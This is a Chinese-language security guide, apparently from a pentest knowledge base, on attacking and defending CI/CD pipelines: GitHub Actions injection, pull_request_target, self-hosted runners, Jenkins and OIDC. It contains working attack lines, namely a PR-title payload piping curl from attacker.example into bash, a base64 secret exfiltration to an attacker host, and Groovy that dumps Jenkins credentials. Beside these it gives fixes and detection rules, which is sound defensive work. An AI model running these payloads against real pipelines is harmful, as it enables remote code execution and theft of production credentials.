# CI/CD 流水线攻击面：Workflow 注入、runner 滥用、secret 泄露

> 被 `supply-chain-security` 引用。CI/CD 的本质是**"用高权限身份执行不可信代码"**。
> 每一个能触发流水线的输入，都可能是一条到生产凭据的路径。

## 一、先画清流水线的信任边界

```text
触发源 → workflow 定义 → runner 类型 → 执行的代码 → 拿到的 secret → 能到达的环境
```

| 层次 | 攻击面 | 典型问题 |
| --- | --- | --- |
| 触发源 | push / PR / issue / comment / schedule / workflow_run | PR 来自 fork 但仍执行 |
| workflow 定义 | `on:` / `permissions:` / `env:` | 权限过宽、表达式注入 |
| runner | GitHub-hosted / self-hosted / 容器 | self-hosted 未隔离 |
| 代码 | `run:` / `uses:` / 依赖安装 | 脚本注入、action 投毒 |
| secret | repo / org / environment | 可被 `echo` 或外带 |
| 环境 | deploy key / cloud role / registry | OIDC 信任策略过宽 |

**第一步永远是读 workflow**：

```bash
# 列出所有 workflow
ls .github/workflows/
for f in .github/workflows/*.yml; do echo "=== $f"; head -40 "$f"; done

# 关键字段速查
grep -nE 'on:|pull_request_target|workflow_run|permissions:|secrets\.|uses:' .github/workflows/*.yml
```

## 二、Workflow 注入（最经典的 RCE）

**原理**：`${{ }}` 表达式在**执行前**被文本替换进 shell 脚本。如果表达式引用了
用户可控的内容（PR 标题、issue body、commit message），就变成了 shell 注入。

**易受攻击的上下文**（官方标注为 untrusted）：

```text
github.event.issue.title
github.event.issue.body
github.event.pull_request.title
github.event.pull_request.body
github.event.comment.body
github.event.review.body
github.event.pages.*.page_name
github.event.pull_request.head.ref
github.event.pull_request.head.label
github.head_ref
github.event.workflow_run.head_branch
github.event.commits.*.message
```

**脆弱写法（真实存在的模式）**：

```yaml
# 危险：PR 标题直接进 shell
- name: Greet
  run: echo "Hello ${{ github.event.pull_request.title }}"

# 危险：issue body 拼进脚本
- name: Label
  run: |
    TITLE="${{ github.event.issue.title }}"
    gh issue edit ${{ github.event.issue.number }} --title "$TITLE"
```

**利用**：PR 标题设为

```text
"; curl -s https://attacker.example/x.sh | bash; echo "
```

就会在 runner 上执行。若这是个 `pull_request_target` 触发的 workflow，
secret 是可读的。

**安全写法**（报告里给修复建议必须写这个）：

```yaml
# 用环境变量中转，不做文本替换
- name: Greet
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Hello $TITLE"
```

**检测**：

```bash
# 扫描所有 workflow 里直接内联的表达式
grep -nE '\$\{\{\s*github\.(event|head_ref)' .github/workflows/*.yml
# 凡是出现在 run: 里的，都是候选
```

## 三、`pull_request_target` 滥用

`pull_request_target` 与 `pull_request` 的关键差别：

| 触发 | 代码来源 | secret | 适用 |
| --- | --- | --- | --- |
| `pull_request` | **PR 的 head** | 无（fork PR 不给 secret） | 安全的默认 |
| `pull_request_target` | **base 分支**（默认分支） | **有** | 需要给 PR 打标签/评论时 |
| `workflow_run` | base 分支 | 有 | 需要在另一个 workflow 之后跑 |

**经典漏洞模式**：

```yaml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}    # ← 检出攻击者的代码
      - run: npm install && npm run build                    # ← 执行攻击者的代码
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}                  # ← 有 secret
```

这里 `ref` 指向 PR 的 head，等于把不可信代码拉到有 secret 的环境里执行。
攻击者只需在 `package.json` 的 `postinstall` 里加一行外带。

```bash
# 更隐蔽：不 checkout head，但读 PR 的文件
- run: |
    gh pr diff ${{ github.event.pull_request.number }} > diff.txt
    python3 analyze.py diff.txt       # analyze.py 来自 base，但如果它 import 了 PR 的文件…
```

**检测**：

```bash
grep -nB2 -A8 'pull_request_target' .github/workflows/*.yml
# 高危信号：
#   1) 显式 checkout head.sha / head.ref
#   2) run: 里执行 PR 提供的脚本或 npm install
#   3) 同时 env: 引用了 secrets.*
```

## 四、self-hosted runner 风险

| 风险 | 说明 |
| --- | --- |
| 持久化 | runner 不在容器里，攻击者的进程可以留在机器上 |
| 网络位置 | 常在内网，能访问生产数据库/内网 API |
| 凭据残留 | 上一个 job 的文件、env、`~/.aws` 都还在 |
| 多租户 | 多个仓库共用一个 runner → 横向 |
| 无 ephemeral | 不像 GitHub-hosted 每次重置 |

```bash
# 在 self-hosted runner 上（已获得执行权）能看到什么
env | grep -iE 'github|runner|token|aws|azure|gcp'
ls -la ~/.aws ~/.config/gcloud ~/.azure 2>/dev/null
cat /etc/hosts
ip addr
ls /var/run/docker.sock 2>/dev/null && docker ps
ls -la /home/*/.ssh 2>/dev/null
```

**判据**：能读到 runner 的 `_work/_temp/_github_workflow/event.json`（含完整事件负载）、
`_diag/` 日志（含历史 job 输出），基本等于能读之前所有 job 的 secret 痕迹。

```bash
# GitHub Actions 的 runner 目录结构
ls -la /home/runner/_work/_temp/_github_workflow/
cat /home/runner/_work/_temp/_github_workflow/event.json | jq .    # 完整事件
ls /home/runner/_diag/
```

**检测**：

```bash
# workflow 里是否用了 self-hosted
grep -n 'runs-on:' .github/workflows/*.yml | grep -i self-hosted
# 高危：self-hosted + pull_request_target
```

## 五、Secret 泄露的路径

| 路径 | 手法 | 检测 |
| --- | --- | --- |
| 日志打印 | `echo $SECRET` / `set -x` / 报错堆栈 | GitHub 会 mask 已知 secret，但 base64 后不 mask |
| 外带 | `curl https://attacker/?d=$SECRET` | 出向流量监控 |
| 产物 | 把 secret 写进 artifact / 缓存 | artifact 内容审计 |
| 环境文件 | `$GITHUB_ENV` 写入后跨 step 传播 | 环境文件写入审计 |
| 错误信息 | 让程序把 token 打进异常 | 日志扫描 |
| 子进程 | 第三方 action 读 env | action 权限 |
| fork PR | `pull_request` 默认无 secret，但 `pull_request_target` 有 | 见上节 |

```bash
# 常见 secret 名称（扫描 workflow 时重点看）
grep -nE 'secrets\.[A-Z_]+' .github/workflows/*.yml | sed 's/.*secrets\.//' | sort -u

# 高危组合：secret 出现在 run: 的 env 里，且 run: 执行了不可信代码
```

**base64 绕过 mask 的原理**：GitHub 的 mask 是**字符串匹配**，`$SECRET` 直接打印会被替换成 `***`，
但 `echo $SECRET | base64` 输出的是不同字符串，不会被 mask。

```yaml
# 攻击者视角（在 PR 里）
- run: echo "${{ secrets.API_KEY }}" | base64 | curl -X POST --data-binary @- https://attacker/
```

**检测**：扫描 job 日志里是否有异常的 base64 片段、出向请求。

## 六、Jenkins 的 script console（最直接）

Jenkins 的 `/script` 是 Groovy 控制台，**有它等于有 Jenkins 主机**。

```bash
# 判定是否暴露（未授权）
curl -s http://jenkins.local:8080/script
# 返回 Groovy 控制台页面 = 未授权访问

# 有账号但权限不足时，看能否读
curl -s http://jenkins.local:8080/scriptText
```

```groovy
// 通过 /script 执行（授权环境）
println "id".execute().text
println new File("/var/jenkins_home/secrets/master.key").text
println Jenkins.instance.getRootUrl()

// 列出所有凭据（这是最有价值的）
Jenkins.instance.getAllItems(com.cloudbees.plugins.credentials.common.IdCredentials.class)
// 或
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
  Jenkins.instance, null, null)
creds.each { println "${it.id} : ${it.username} : ${it.password}" }
```

**其它 Jenkins 落点**：

```bash
# 1) 凭据文件（加密，但 master.key 也在旁边）
ls /var/jenkins_home/credentials.xml
cat /var/jenkins_home/secrets/master.key
cat /var/jenkins_home/secrets/hudson.util.Secret

# 2) 解密（拿到 master.key + hudson.util.Secret 后可解）
#    工具：jenkins-credentials-decryptor
java -jar jenkins-credentials-decryptor.jar \
  -m /var/jenkins_home/secrets/master.key \
  -s /var/jenkins_home/secrets/hudson.util.Secret \
  -c /var/jenkins_home/credentials.xml

# 3) job 配置里的明文（历史遗留）
grep -rE '(password|secret|token)' /var/jenkins_home/jobs/*/config.xml | head

# 4) 构建日志
grep -rE '(AKIA|ghp_|sk-)' /var/jenkins_home/jobs/*/builds/*/log | head
```

**检测**：

```bash
# Jenkins 审计日志
grep -i 'script' /var/log/jenkins/audit.log
# 关注：/script 或 /scriptText 的访问，尤其是非管理员账号
```

## 七、供应链投毒的落点

| 落点 | 手法 | 检测 |
| --- | --- | --- |
| 第三方 action | `uses: someone/action@v1` 的 tag 被移动 | pin 到 commit SHA |
| action 的 `post:` | 安装后在 post 阶段外带 | 审计 action 源码 |
| npm `postinstall` | `npm install` 触发任意脚本 | `--ignore-scripts` |
| pip `setup.py` | 安装时执行 | `--no-build-isolation` 反向 |
| Docker base image | `FROM x:latest` 被替换 | digest pin |
| 缓存投毒 | `actions/cache` 的 key 可预测 | cache key 加 hash |
| artifact 传递 | 上一个 job 的 artifact 被篡改 | artifact 签名 |
| 依赖混淆 | 内网包名被公网抢注 | scope/registry 配置 |

```bash
# 扫描 workflow 里的未固定版本
grep -nE 'uses:\s*[^@]+@(v[0-9]+|main|master|latest)' .github/workflows/*.yml
# 安全：uses: action/name@<40位SHA>

# 扫描 Dockerfile
grep -nE '^FROM' Dockerfile | grep -v '@sha256'
```

## 八、OIDC 与云角色（现代最常见的提权路径）

```yaml
# 危险：信任策略过宽
# AWS IAM trust policy:
#   "Condition": {"StringLike": {"token.actions.githubusercontent.com:sub": "repo:org/*"}}
# → 该 org 下任何仓库的任何分支都能 assume 这个角色
```

```bash
# workflow 里拿 OIDC token
- run: |
    TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
    echo "$TOKEN" | cut -d. -f2 | base64 -d | jq .   # 看 sub/aud
```

**判据**：JWT 的 `sub` 形如 `repo:org/repo:ref:refs/heads/main`。
如果信任策略是 `repo:org/*:*`，则**任何仓库**都能用；如果是 `repo:org/repo:pull_request`，
则 PR 也能用 —— 这两种都是常见过宽。

## 九、检测视角（防守方）

| 手法 | 日志/信号 | 具体特征 |
| --- | --- | --- |
| workflow 表达式注入 | Actions job 日志 | `run:` 步骤里出现 PR 标题原文被当作命令执行；日志有 `command not found` 但退出码 0 |
| `pull_request_target` 滥用 | Actions 运行记录 | `event=pull_request_target` 且 `checkout ref` 是 `refs/pull/*/merge` |
| secret 外带 | 出向流量 / 代理日志 | runner 在构建期访问非常规域名，POST body 是 base64 |
| self-hosted 持久化 | runner 主机 auditd / EDR | job 结束后仍有子进程存活；`~/.ssh`、`~/.aws` 被访问 |
| Jenkins `/script` | Jenkins audit log | `POST /script` 或 `/scriptText`，`userName` 非管理员 |
| action tag 漂移 | 依赖审计 | 同一 `uses: x@v1` 的 commit SHA 在不同时间不同 |
| OIDC 换角色 | CloudTrail | `AssumeRoleWithWebIdentity` 的 `sub` 是 `repo:org/*` 通配 |

```text
GitHub 侧建议开启：
- Settings → Actions → "Require approval for all outside collaborators"
- 组织级 "Allow GitHub Actions to create and approve pull requests" = 关闭
- 审计 API：GET /orgs/{org}/audit-log?phrase=action:workflows
```

## 十、验伤信号

| 声称 | 硬证据 | 假成功反例 |
| --- | --- | --- |
| workflow 注入成立 | PR 标题里的命令在 job 日志里产生**回显**，或收到外带请求 | 只是表达式被替换了但 shell 没执行（引号把它吃掉了） |
| 拿到 secret | `base64` 解码后是真实凭据，且能用它调目标 API | 只看到 `***`（被 mask），或拿到的是空值 |
| self-hosted 横向 | 能读到 runner 上**上一个 job** 的临时文件 | 只看到自己的 job 目录 |
| Jenkins RCE | `/script` 返回命令输出 | 返回登录页（需要认证） |
| OIDC 提权 | 用换来的临时凭据 `aws sts get-caller-identity` 成功 | 换 token 成功但 assume-role 被拒（sub 不匹配策略） |

## 十一、常见坑

1. **fork PR 拿不到 secret**。`pull_request` 触发的 fork PR 没有 secret，
   很多"注入成功"的报告其实打的是同仓库分支 PR。
2. **GitHub 会 mask secret**。直接 `echo` 看不到，必须编码（base64/hex）或外带。
3. **`${{ }}` 在 `if:` 里不是 shell 注入**。只有进到 `run:` 才是；`if:` 是表达式求值。
4. **action 的 tag 可以移动**。`@v1` 不是不可变的，必须 pin SHA（这是真实攻击面）。
5. **self-hosted 的 `_work` 目录权限**。job 之间可能互相可见，但也有环境隔离配置，
   先确认是不是 ephemeral runner。
6. **Jenkins 的 CSRF 保护**。`/script` 需要 POST + crumb，未授权时是 GET 页面，
   不等于能执行。
7. **OIDC 的 `aud` 必须匹配**。audience 写错（如 `sts.amazonaws.com` vs 自定义）
   会导致换不出凭据，误判"配置安全"。